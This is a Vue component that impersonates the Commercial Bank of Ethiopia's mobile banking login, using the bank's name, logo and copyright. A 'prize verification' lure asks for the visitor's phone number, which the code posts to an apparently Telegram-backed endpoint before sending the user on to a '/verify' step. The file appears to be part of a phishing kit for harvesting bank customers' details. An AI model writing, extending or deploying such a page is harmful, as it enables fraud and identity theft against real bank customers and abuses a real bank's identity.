<template>
  <main class="mobile-screen">
    <header class="topbar">
      <div>
        <p class="app-title">CBE Mobile Banking</p>
        <p class="app-subtitle">Secure mobile banking experience</p>
      </div>

      <div class="topbar-actions" aria-label="Quick actions">
        <button class="icon-button" type="button" aria-label="Notifications">
          <span class="bell-icon" />
        </button>
        <button class="lang-pill" type="button" aria-label="Current language">
          EN
        </button>
      </div>
    </header>

    <section class="hero-card">
      <div class="logo-wrap" aria-label="Commercial Bank of Ethiopia logo">
        <img class="logo-image" src="/logo.svg" alt="Commercial Bank of Ethiopia logo">
      </div>

      <div class="hero-copy">
        <h1>Welcome!</h1>
        <p class="brand-name">Commercial Bank of Ethiopia</p>
        <p class="greeting">Good Afternoon</p>
      </div>

      <p class="helper-text">
        Confirm your phone number to check your eligibility and continue to the secure prize verification step.
      </p>

      <label class="input-block" for="phone">
        <span class="sr-only">Phone number</span>
        <input
          id="phone"
          v-model="phone"
          type="tel"
          inputmode="tel"
          placeholder="Phone Number"
        >
      </label>

      <button
        class="continue-button"
        type="button"
        aria-label="Continue"
        :disabled="isSubmitting"
        @click="goNext"
      >
        <span class="arrow-icon" />
      </button>

      <p v-if="statusMessage" class="status-text">{{ statusMessage }}</p>
    </section>

    <footer class="bottom-panel">
      <div class="chat-row">
        <span>Do you have any question?</span>
        <button class="chat-pill" type="button">Chatbot</button>
      </div>

      <button class="service-button" type="button">
        <span class="service-icon">◌</span>
        <span>Non-Financial Services</span>
      </button>

      <p class="copyright">Copyright © Commercial Bank Of Ethiopia</p>
    </footer>
  </main>
</template>

<script setup lang="ts">
const phone = ref('')
const statusMessage = ref('')
const isSubmitting = ref(false)

async function goNext() {
  statusMessage.value = ''

  if (!phone.value.trim()) {
    statusMessage.value = 'Enter your phone number to continue.'
    return
  }

  isSubmitting.value = true

  try {
    await $fetch('/api/telegram-demo', {
      method: 'POST',
      body: {
        stage: 'phone',
        phone: phone.value.trim()
      }
    })

    await navigateTo({
      path: '/verify',
      query: {
        phone: phone.value.trim()
      }
    })
  } catch (error: any) {
    statusMessage.value =
      error?.data?.statusMessage ||
      error?.statusMessage ||
      error?.message ||
      'Telegram send failed.'
  } finally {
    isSubmitting.value = false
  }
}
</script>
